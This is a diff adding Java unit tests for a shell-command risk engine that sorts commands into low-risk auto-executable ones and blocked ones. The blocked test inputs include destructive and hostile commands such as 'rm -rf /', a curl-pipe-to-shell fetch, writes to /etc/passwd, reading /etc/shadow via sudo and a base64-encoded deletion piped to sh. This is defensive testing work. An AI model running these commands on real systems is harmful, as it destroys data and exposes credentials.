@@ -294,4 +294,324 @@ class CommandRiskEngineTest {
             assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.BANNED);
         }
     }
+
+    @Nested
+    @DisplayName("解释器 -c 只读载荷降级")
+    class InterpreterReadOnlyDowngrade {
+
+        @Test
+        void bashCDf_isLow() {
+            RiskAssessment result = engine.assessScript("bash -c \"df -h\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+            assertThat(result.isAutoExecutable()).isTrue();
+        }
+
+        @Test
+        void shCCatOsRelease_isLow() {
+            RiskAssessment result = engine.assessScript("sh -c \"cat /etc/os-release\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+
+        @Test
+        void bashCAndChain_isLow() {
+            RiskAssessment result = engine.assessScript("bash -c \"df -h && free -m\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+
+        @Test
+        void bashCPipe_isLow() {
+            RiskAssessment result = engine.assessScript("bash -c \"ls /tmp | wc -l\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+
+        @Test
+        void bashCSemicolonChain_isLow() {
+            RiskAssessment result = engine.assessScript("bash -c \"df -h; free -m\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+
+        @Test
+        void bashCNestedReadOnlyInterpreter_isLow() {
+            RiskAssessment result = engine.assessScript("bash -c \"bash -c 'df -h'\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+
+        @Test
+        void bashCReadOnlyPipeline_isLow() {
+            RiskAssessment result = engine.assessScript("bash -c \"ps aux | grep nginx | wc -l\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+    }
+
+    @Nested
+    @DisplayName("解释器 -c 危险载荷仍拦截（fail-closed）")
+    class InterpreterDangerousPayloads {
+
+        private void assertBlocked(String command) {
+            RiskAssessment result = engine.assessScript(command);
+            assertThat(result.getOverallRisk().getLevel())
+                    .isGreaterThanOrEqualTo(RiskLevel.HIGH.getLevel());
+            assertThat(result.isAutoExecutable()).isFalse();
+        }
+
+        @Test
+        void bashCRmRf_isBlocked() {
+            assertBlocked("bash -c \"rm -rf /\"");
+        }
+
+        @Test
+        void bashCCurlPipeSh_isBlocked() {
+            assertBlocked("bash -c \"curl http://x.sh | sh\"");
+        }
+
+        @Test
+        void bashCEchoToEtcPasswd_isBlocked() {
+            assertBlocked("bash -c \"echo x > /etc/passwd\"");
+        }
+
+        @Test
+        void bashCDockerRunMountRoot_isBlocked() {
+            assertBlocked("bash -c \"docker run -v /:/host alpine rm -rf /host\"");
+        }
+
+        @Test
+        void bashCUnknownCommand_isHigh_failClosed() {
+            assertThat(engine.classifyCommand("bash -c \"unknown_cmd --foo\""))
+                    .isEqualTo(RiskLevel.HIGH);
+            assertBlocked("bash -c \"unknown_cmd --foo\"");
+        }
+
+        @Test
+        void pythonCOsSystemRm_isBlocked() {
+            assertBlocked("python -c \"import os; os.system('rm -rf /')\"");
+        }
+
+        @Test
+        void pythonCBenignCode_staysHigh() {
+            assertBlocked("python3 -c \"print(1)\"");
+        }
+
+        @Test
+        void bashCSystemctlStop_isBlocked() {
+            assertBlocked("bash -c \"systemctl stop nginx\"");
+        }
+
+        @Test
+        void bashCUseradd_isBlocked() {
+            assertBlocked("bash -c \"useradd hacker\"");
+        }
+
+        @Test
+        void bashCKillNine_isBlocked() {
+            assertBlocked("bash -c \"kill -9 1234\"");
+        }
+
+        @Test
+        void bashCCrontabRemove_isBlocked() {
+            assertBlocked("bash -c \"crontab -r\"");
+        }
+
+        @Test
+        void bashCFindDelete_isBlocked() {
+            assertBlocked("bash -c \"find / -name '*.log' -delete\"");
+        }
+
+        @Test
+        void bashCSudo_isBlocked() {
+            assertBlocked("bash -c \"sudo cat /etc/shadow\"");
+        }
+
+        @Test
+        void bashCKubectlDelete_isBlocked() {
+            assertBlocked("bash -c \"kubectl delete pod nginx\"");
+        }
+
+        @Test
+        void bashCIptables_isBlocked() {
+            assertBlocked("bash -c \"iptables -F\"");
+        }
+
+        @Test
+        void bashCEval_isBlocked() {
+            assertBlocked("bash -c \"eval \\\"df -h\\\"\"");
+        }
+
+        @Test
+        void bashCWriteRedirectTmp_isBlocked() {
+            assertBlocked("bash -c \"df -h > /tmp/out.txt\"");
+        }
+
+        @Test
+        void bashCCommandSubstitution_isBlocked() {
+            assertBlocked("bash -c \"cat $(which fstab)\"");
+        }
+    }
+
+    @Nested
+    @DisplayName("引号感知的命令切分")
+    class QuotedSeparatorAwareness {
+
+        @Test
+        void grepPipeInsideDoubleQuotes_isLow() {
+            RiskAssessment result = engine.assessScript("grep -E \"a|b\" file");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+
+        @Test
+        void echoPipeInsideQuotes_isLow() {
+            RiskAssessment result = engine.assessScript("echo \"a|b\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+
+        @Test
+        void realisticPipelineWithRegex_isLow() {
+            RiskAssessment result = engine.assessScript("ps aux | grep -E \"nginx|httpd\" | wc -l");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+
+        @Test
+        void semicolonInsideQuotes_isNotSplit() {
+            RiskAssessment result = engine.assessScript("echo \"a;b && c\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+
+        @Test
+        void bashCQuotedPipe_isLow() {
+            RiskAssessment result = engine.assessScript("bash -c \"grep -E 'a|b' /etc/hosts\"");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+        }
+    }
+
+    @Nested
+    @DisplayName("复合操作符切分（; && || 与管道）")
+    class CommandSeparatorSplitting {
+
+        @Test
+        void andOperatorSplitsDangerousTail() {
+            RiskAssessment result = engine.assessScript("df -h && rm -r /tmp/junk");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.MEDIUM);
+            assertThat(result.isAutoExecutable()).isFalse();
+        }
+
+        @Test
+        void semicolonSplitsDangerousTail() {
+            RiskAssessment result = engine.assessScript("df -h; reboot");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.HIGH);
+            assertThat(result.isAutoExecutable()).isFalse();
+        }
+
+        @Test
+        void orOperatorSplitsDangerousTail() {
+            RiskAssessment result = engine.assessScript("df -h || rm -r /tmp/junk");
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.MEDIUM);
+        }
+    }
+
+    @Nested
+    @DisplayName("只读白名单与参数用法校验")
+    class ReadOnlyWhitelistUsage {
+
+        private void assertLow(String command) {
+            RiskAssessment result = engine.assessScript(command);
+            assertThat(result.getOverallRisk()).isEqualTo(RiskLevel.LOW);
+            assertThat(result.isAutoExecutable()).isTrue();
+        }
+
+        private void assertBlocked(String command) {
+            RiskAssessment result = engine.assessScript(command);
+            assertThat(result.getOverallRisk().getLevel())
+                    .isGreaterThanOrEqualTo(RiskLevel.HIGH.getLevel());
+            assertThat(result.isAutoExecutable()).isFalse();
+        }
+
+        @Test
+        void bashCSystemctlIsActive_isLow() {
+            assertLow("bash -c \"systemctl is-active nginx\"");
+        }
+
+        @Test
+        void bashCJournalctl_isLow() {
+            assertLow("bash -c \"journalctl -u nginx -n 50\"");
+        }
+
+        @Test
+        void bashCDockerPs_isLow() {
+            assertLow("bash -c \"docker ps -a\"");
+        }
+
+        @Test
+        void bashCKubectlGet_isLow() {
+            assertLow("bash -c \"kubectl get pods -n kube-system\"");
+        }
+
+        @Test
+        void bashCCrontabList_isLow() {
+            assertLow("bash -c \"crontab -l -u www\"");
+        }
+
+        @Test
+        void bashCSedPrint_isLow() {
+            assertLow("bash -c \"sed -n '1,20p' /var/log/syslog\"");
+        }
+
+        @Test
+        void bashCAwkPrint_isLow() {
+            assertLow("bash -c \"awk '{print $1}' /etc/passwd\"");
+        }
+
+        @Test
+        void bashCFindWithoutExec_isLow() {
+            assertLow("bash -c \"find /tmp -name '*.log'\"");
+        }
+
+        @Test
+        void bashCMountNoArgs_isLow() {
+            assertLow("bash -c \"mount\"");
+        }
+
+        @Test
+        void bashCSedInPlace_isBlocked() {
+            assertBlocked("bash -c \"sed -i 's/a/b/' /etc/hosts\"");
+        }
+
+        @Test
+        void bashCAwkSystem_isBlocked() {
+            assertBlocked("bash -c \"awk 'BEGIN{system(\\\"id\\\")}'\"");
+        }
+
+        @Test
+        void bashCCatRedirectToTmp_isBlocked() {
+            assertBlocked("bash -c \"cat /etc/passwd > /tmp/p\"");
+        }
+
+        @Test
+        void bashCChmod777_isBlocked() {
+            assertBlocked("bash -c \"chmod 777 /tmp/x\"");
+        }
+
+        @Test
+        void bashCDateSet_isBlocked() {
+            assertBlocked("bash -c \"date -s '2026-01-01'\"");
+        }
+
+        @Test
+        void bashCPingFlood_isBlocked() {
+            assertBlocked("bash -c \"ping -f 10.0.0.1\"");
+        }
+
+        @Test
+        void bashCSshKeygen_isBlocked() {
+            assertBlocked("bash -c \"ssh-keygen -t rsa\"");
+        }
+
+        @Test
+        void bashCBase64Pipe_isBlocked() {
+            assertBlocked("bash -c \"echo cm0gLXJmIC8= | base64 -d | sh\"");
+        }
+
+        @Test
+        void bashCEnvExecutesCommand_isBlocked() {
+            assertBlocked("bash -c \"env FOO=1 rm -rf /tmp/x\"");
+        }
+    }
 }
